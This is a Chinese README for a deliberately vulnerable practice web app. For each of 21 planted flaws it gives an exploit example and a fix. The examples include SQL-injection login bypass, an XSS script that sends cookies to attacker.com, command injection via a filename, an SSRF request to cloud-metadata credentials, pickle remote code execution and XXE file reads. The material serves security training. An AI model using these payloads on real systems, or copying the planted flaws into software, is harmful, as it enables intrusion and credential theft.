# WorldPress — 漏洞清单（学习用途）

> 本项目用于 Web 安全学习，代码中故意植入了以下漏洞。
> **严禁用于任何生产环境或对未授权目标的测试。**

---

## 漏洞总览（共 21 个，跨 6 条路径）

| # | 漏洞类型 | 路径 / 端点 | 代码位置 |
|---|----------|------------|---------|
| 1 | SQL 注入（登录） | `POST /api/auth/login` | `routes/auth.py` |
| 2 | 开放重定向 | `POST /api/auth/login?redirect=` | `routes/auth.py` |
| 3 | 无速率限制（暴力破解） | `POST /api/auth/login` | `routes/auth.py` |
| 4 | 弱 JWT 密钥 | 所有需鉴权端点 | `config.py`, `routes/auth.py` |
| 5 | IDOR（越权读取用户） | `GET /api/users/{id}` | `routes/users.py` |
| 6 | 批量赋值（提权） | `PUT /api/users/{id}` | `routes/users.py` |
| 7 | 敏感数据暴露（密码哈希） | `GET /api/users` / `GET /api/users/{id}` | `routes/users.py` |
| 8 | SQL 注入（搜索） | `GET /api/posts?search=` | `routes/posts.py` |
| 9 | 存储型 XSS（文章内容） | `POST /api/posts` / `PUT /api/posts/{id}` | `routes/posts.py` |
| 10 | IDOR（越权编辑/删除文章） | `PUT /DELETE /api/posts/{id}` | `routes/posts.py` |
| 11 | 路径穿越（下载） | `GET /api/media/download?file=` | `routes/media.py` |
| 11b | 路径穿越（预览，无鉴权） | `GET /api/media/preview?path=` | `routes/media.py` |
| 12 | 不限制文件上传类型 | `POST /api/media/upload` | `routes/media.py` |
| 13 | 命令注入 | `POST /api/media/thumbnail` | `routes/media.py` |
| 14 | SSRF | `POST /api/settings/fetch-url` | `routes/settings.py` |
| 15 | 硬编码凭据泄露 | `GET /api/settings` | `config.py`, `routes/settings.py` |
| 16 | 不安全反序列化（Pickle） | `POST /api/settings/import` | `routes/settings.py` |
| 17 | XXE（XML 外部实体） | `POST /api/settings/import-xml` | `routes/settings.py` |
| 18 | 信息泄露（完整堆栈跟踪） | 所有异常 | `app.py` |
| 19 | 访问控制绕过（Header 注入） | `GET /api/users`, `/api/settings` 等管理接口 | `routes/users.py`, `routes/settings.py` |
| 20 | 存储型 XSS（评论） | `POST /api/posts/{id}/comments` | `routes/posts.py` |
| 21 | 反射型 XSS（评论作者） | `POST /api/posts/{id}/comments`（错误响应） | `routes/posts.py` |

---

## 各漏洞详细说明与利用示例

### 1. SQL 注入 — 登录绕过
**端点：** `POST /api/auth/login`

登录查询使用字符串格式化拼接，可通过经典 `' OR '1'='1` 绕过身份验证。

```bash
curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\'' OR '\''1'\''='\''1", "password": "x"}'
```

**修复方案：** 使用参数化查询 `cursor.execute("SELECT ... WHERE username=?", (username,))`

---

### 2. 开放重定向
**端点：** `POST /api/auth/login?redirect=https://evil.com`

登录成功后，`redirect` 参数未经白名单校验就被直接使用，可将用户跳转到任意外部站点（钓鱼攻击）。

```
POST /api/auth/login?redirect=https://attacker.com
```

前端会执行 `window.location.href = data.redirect`，完成重定向。

**修复方案：** 验证 redirect URL 必须以 `/` 开头或在白名单域名内。

---

### 3. 无速率限制 — 暴力破解
**端点：** `POST /api/auth/login`

登录接口没有任何速率限制或账号锁定机制，攻击者可无限次尝试密码。

```bash
for pw in password 123456 admin123 letmein; do
  curl -s -X POST http://localhost:5000/api/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"$pw\"}" | grep -v error
done
```

**修复方案：** 使用 Flask-Limiter 限流；连续失败后锁定账号。

---

### 4. 弱 JWT 密钥
**文件：** `config.py`，密钥为 `wp_secret_2024`

密钥短且可预测，可被离线字典攻击暴力破解，进而伪造任意用户的 Token。

```python
import jwt, itertools
token = "<从登录响应中获取>"
# 使用 hashcat 或 jwt_tool 进行字典攻击
# hashcat -a 0 -m 16500 <token> wordlist.txt
```

**修复方案：** 使用 `secrets.token_hex(32)` 生成并从环境变量读取密钥。

---

### 5. IDOR — 越权读取用户信息
**端点：** `GET /api/users/2`

任何已登录用户（包括普通 editor）均可读取任意用户的详细信息，包括密码哈希。

```bash
curl http://localhost:5000/api/users/1 \
  -H "Authorization: Bearer <editor_token>"
```

**修复方案：** 检查 `current_user["user_id"] == user_id` 或 `role == "admin"`。

---

### 6. 批量赋值 — 水平提权
**端点：** `PUT /api/users/{id}`

接口直接将客户端 JSON 中所有字段映射到 UPDATE 语句，攻击者可将自己的 `role` 改为 `admin`。

```bash
curl -X PUT http://localhost:5000/api/users/2 \
  -H "Authorization: Bearer <editor_token>" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'
```

**修复方案：** 维护允许修改的字段白名单（如 `bio`, `email`），role 变更需要管理员权限。

---

### 7. 敏感数据暴露 — 密码哈希泄露
**端点：** `GET /api/users`，`GET /api/users/{id}`

API 响应中直接包含 `password` 字段（MD5 哈希）。MD5 哈希可被彩虹表秒破。

```bash
# 对 admin123 的 MD5: 0192023a7bbd73250516f069df18b500
echo -n "admin123" | md5sum
```

**修复方案：** 响应中排除 `password` 字段；使用 bcrypt 存储密码。

---

### 8. SQL 注入 — 搜索
**端点：** `GET /api/posts?search=`

搜索参数被直接拼入 LIKE 查询，可使用 UNION 注入读取任意表数据。

```bash
curl "http://localhost:5000/api/posts?search=%25' UNION SELECT id,username,password,email,role,NULL,NULL,NULL,NULL,NULL,NULL FROM users--"
```

**修复方案：** 使用参数化查询 `LIKE ?` 并传入 `f"%{search}%"`。

---

### 9. 存储型 XSS — 文章内容
**端点：** `POST /api/posts`，前端 `PostEdit.vue`

文章内容以原始 HTML 存入数据库，前端使用 `v-html` 直接渲染，任何查看文章的用户都会执行注入的脚本。

```json
{
  "title": "XSS Test",
  "content": "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"
}
```

**修复方案：** 服务端使用 bleach 净化 HTML；前端改用文本渲染而非 `v-html`。

---

### 10. IDOR — 越权修改/删除文章
**端点：** `PUT /api/posts/{id}`，`DELETE /api/posts/{id}`

任何登录用户均可修改或删除其他人的文章，后端不校验文章所属权。

```bash
# editor 用户删除 admin 的文章
curl -X DELETE http://localhost:5000/api/posts/1 \
  -H "Authorization: Bearer <editor_token>"
```

**修复方案：** 验证 `post.author_id == current_user.user_id` 或 `role == "admin"`。

---

### 11. 路径穿越 — 文件下载
**端点：** `GET /api/media/download?file=../../config.py`

`file` 参数与 uploads 目录拼接时未做路径规范化，可读取服务器上的任意文件。

```bash
curl "http://localhost:5000/api/media/download?file=../../config.py" \
  -H "Authorization: Bearer <token>" -o stolen_config.py
```

**修复方案：**
```python
real = os.path.realpath(file_path)
if not real.startswith(os.path.realpath(UPLOAD_FOLDER)):
    abort(403)
```

---

### 11b. 路径穿越 — 无需鉴权预览
**端点：** `GET /api/media/preview?path=../../backend/config.py`

`/preview` 端点不需要登录，且同样存在路径穿越漏洞，攻击面更大。

---

### 12. 不限制文件上传类型
**端点：** `POST /api/media/upload`

仅调用 `secure_filename` 防止路径穿越，但未验证文件扩展名或 MIME 类型，可上传 `.py`、`.sh` 等可执行文件。

**修复方案：** 校验扩展名白名单 `ALLOWED_EXTENSIONS = {'png','jpg','gif','pdf'}`。

---

### 13. 命令注入
**端点：** `POST /api/media/thumbnail`

`filename` 和 `size` 参数直接拼入 shell 命令，可执行任意系统命令。

```json
{"filename": "a.jpg; id > /tmp/pwned.txt #", "size": "150x150"}
```

**修复方案：** 使用 `subprocess.run([...], shell=False)` 传递参数列表，而非 shell=True 字符串。

---

### 14. SSRF
**端点：** `POST /api/settings/fetch-url`

服务端代理访问任意 URL，可探测内网服务、云实例元数据等。

```json
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```

```json
{"url": "http://127.0.0.1:5000/api/users"}
```

**修复方案：** 解析并校验目标 IP 不属于私有地址段；使用 URL 白名单。

---

### 15. 硬编码凭据泄露
**文件：** `config.py`，**端点：** `GET /api/settings`

默认凭据 `admin/admin123` 写死在代码中，且管理员调用 `/api/settings` 时会在响应体中明文返回。

**修复方案：** 通过环境变量传入凭据；响应中不返回凭据字段。

---

### 16. 不安全反序列化（Pickle RCE）
**端点：** `POST /api/settings/import`

接口 base64 解码后直接 `pickle.loads()`，可实现远程代码执行。

```python
import pickle, os, base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id > /tmp/rce.txt',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
# 将 payload 发送到 /api/settings/import
```

**修复方案：** 禁止 pickle；改用 JSON 格式并做 schema 校验。

---

### 17. XXE（XML 外部实体注入）
**端点：** `POST /api/settings/import-xml`

lxml 默认开启实体解析，可通过构造恶意 XML 读取本地文件。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<settings>
  <setting><key>test</key><value>&xxe;</value></setting>
</settings>
```

**修复方案：** `etree.fromstring(xml, parser=etree.XMLParser(resolve_entities=False))`

---

### 18. 信息泄露 — 完整堆栈跟踪
**文件：** `app.py`

全局错误处理器将 Python 完整堆栈跟踪（含文件路径、行号、变量名）返回给客户端。

**修复方案：** 生产环境只返回通用错误消息；将详细信息记录到服务端日志。

---

### 19. 访问控制绕过 — Header 注入
**端点：** 所有管理接口（`/api/users`, `/api/settings` 等）

当请求包含 `X-Admin-Override: true` 头时，`require_admin()` 函数直接返回 True，绕过角色检查。

```bash
curl http://localhost:5000/api/users \
  -H "Authorization: Bearer <editor_token>" \
  -H "X-Admin-Override: true"
```

**修复方案：** 删除该 Header 绕过逻辑；仅根据 JWT 中的角色字段授权。

---

### 20. 存储型 XSS — 评论内容
**端点：** `POST /api/posts/{id}/comments`

评论内容同样以原始 HTML 存储并通过 `v-html` 渲染，影响所有查看文章的访客。

---

### 21. 反射型 XSS — 评论作者
**端点：** `POST /api/posts/{id}/comments`（错误响应）

当 `content` 为空时，`author` 字段直接插入 HTML 响应体并以 `text/html` 类型返回，若浏览器直接渲染则触发 XSS。

```bash
curl -X POST "http://localhost:5000/api/posts/1/comments" \
  -H "Content-Type: application/json" \
  -d '{"author": "<img src=x onerror=alert(1)>", "content": ""}'
```

---

## 技术栈与快速启动

```bash
./start.sh
# 前端: http://localhost:3000
# 后端: http://localhost:5000
# 账号: admin / admin123
```
